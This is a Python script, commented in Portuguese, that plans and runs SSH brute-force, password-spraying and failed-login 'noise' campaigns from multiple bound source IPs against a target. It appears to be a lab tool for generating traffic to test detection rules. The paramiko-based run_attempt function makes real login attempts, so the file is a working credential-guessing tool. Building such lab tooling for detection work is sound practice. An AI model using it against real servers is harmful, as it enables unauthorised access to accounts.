#!/usr/bin/env python3
"""Campanha de ataques SSH reais com múltiplos IPs de origem.

A geração do PLANO (quais tentativas, de que IP, em que ordem) é pura e
testável sem rede — veja tests/test_multi_attack.py. A EXECUÇÃO de verdade
(classe/função run_attempt) usa paramiko e precisa de um alvo real na rede;
não dá para validar isso fora do seu laboratório.

Pré-requisito de rede: rode scripts/attack/add_ips.sh antes, para que os
IPs de origem usados no --config realmente existam na sua interface.

Três tipos de perfil (cobrem as 3 regras do lab):
  bruteforce  muitas tentativas contra 1 conta, 1 IP -> regra de limiar (+ sequência, se acertar)
  spray       poucas tentativas contra várias contas, 1 IP -> regra de spraying
  noise       1 falha a cada N segundos, indefinidamente -> análogo real do falso positivo
              (conta de serviço com credencial velha); serve para testar o tuning
"""
import argparse, json, random, socket, sys, time

try:
    import paramiko
except ImportError:
    paramiko = None


def plan_bruteforce(source_ip, user, wordlist, correct=None, delay=(0.3, 0.8)):
    attempts = [{"source_ip": source_ip, "user": user, "password": p, "delay": round(random.uniform(*delay), 2)}
                for p in wordlist]
    if correct:
        attempts.append({"source_ip": source_ip, "user": user, "password": correct,
                         "delay": round(random.uniform(*delay), 2)})
    return attempts


def plan_spray(source_ip, users, passwords_per_user=2, delay=(0.3, 0.8)):
    attempts = []
    for _ in range(passwords_per_user):
        for u in users:
            attempts.append({"source_ip": source_ip, "user": u, "password": "senha-errada-lab",
                             "delay": round(random.uniform(*delay), 2)})
    return attempts


def plan_noise(source_ip, user, count=15, interval=45):
    return [{"source_ip": source_ip, "user": user, "password": "senha-antiga-lab", "delay": interval}
            for _ in range(count)]


def build_campaign(cfg):
    """cfg: {"profiles": [...]}. Retorna [(nome, [tentativas]), ...]. Sem rede."""
    out = []
    for p in cfg["profiles"]:
        t = p["type"]
        if t == "bruteforce":
            attempts = plan_bruteforce(p["source_ip"], p["user"], p["wordlist"], p.get("correct"))
        elif t == "spray":
            attempts = plan_spray(p["source_ip"], p["users"], p.get("passwords_per_user", 2))
        elif t == "noise":
            attempts = plan_noise(p["source_ip"], p["user"], p.get("count", 15), p.get("interval", 45))
        else:
            raise ValueError(f"tipo de perfil desconhecido: {t!r}")
        out.append((p.get("name", t), attempts))
    return out


def run_attempt(target, port, attempt, timeout=10):
    if paramiko is None:
        sys.exit("Instale: pip install paramiko --break-system-packages")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((attempt["source_ip"], 0))   # sai de verdade por este IP de origem
    try:
        sock.settimeout(timeout)
        sock.connect((target, port))
        t = paramiko.Transport(sock)
        t.start_client(timeout=timeout)
        try:
            t.auth_password(attempt["user"], attempt["password"])
            return True
        except paramiko.AuthenticationException:
            return False
        finally:
            t.close()
    except OSError as e:
        print(f"  [erro de rede] origem {attempt['source_ip']}: {e}")
        return False
    finally:
        sock.close()


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True, help="IP da VM vítima")
    ap.add_argument("--port", type=int, default=22)
    ap.add_argument("--config", required=True, help="arquivo JSON com os perfis")
    ap.add_argument("--dry-run", action="store_true", help="só mostra o plano, não ataca de verdade")
    a = ap.parse_args()
    cfg = json.load(open(a.config, encoding="utf-8"))
    campaign = build_campaign(cfg)

    total = sum(len(att) for _, att in campaign)
    print(f"Campanha com {len(campaign)} perfis, {total} tentativas no total.\n")
    for name, attempts in campaign:
        print(f"== perfil: {name}  ({len(attempts)} tentativas, origem {attempts[0]['source_ip']}) ==")
        if a.dry_run:
            for att in attempts[:3]:
                print("   ", att)
            if len(attempts) > 3:
                print(f"    ... e mais {len(attempts) - 3}")
            continue
        for att in attempts:
            ok = run_attempt(a.target, a.port, att)
            print(f"   {att['source_ip']:>15} -> {att['user']:<16} {'SUCESSO' if ok else 'falha'}")
            time.sleep(att["delay"])
    if a.dry_run:
        print("\n(--dry-run: nada foi enviado pela rede)")


if __name__ == "__main__":
    main()
